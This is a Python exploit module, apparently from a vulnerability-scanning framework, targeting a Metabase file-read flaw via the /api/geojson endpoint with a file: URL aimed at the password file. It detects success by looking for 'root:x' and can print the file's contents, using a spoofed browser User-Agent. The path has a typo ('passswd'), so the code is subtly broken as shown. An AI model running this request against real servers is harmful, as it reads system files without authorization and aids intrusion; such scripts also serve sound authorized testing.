from lib.util.exprequest import ExpRequest
from lib.util.output import Output
import lib.util.globalvar as GlobalVar
"""
+-------------+-----------------------+----------------------------------------------------+
| Target type | Vuln Name             | Impact Version && Vulnerability description        |
+-------------+-----------------------+----------------------------------------------------+
| metabase    | cve_MetaBase_20211123 | [file reading] metabase version >= 1.0.0, < 1.40.5 |
+-------------+-----------------------+----------------------------------------------------+
"""
class metabase():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
            
    def cve_MetaBase_20211123(self):
        appName = 'metabase'
        pocname = 'cve_MetaBase_20211123'
        path = '/api/geojson?url=file:/etc/passswd'
        method = 'get'
        desc = '[file reading] metabase version >= 1.0.0, < 1.40.5'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers)
                if r"root:x" in r.text:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpMetaBase = metabase(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpMetaBase, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(metabase):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpMetaBase, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)
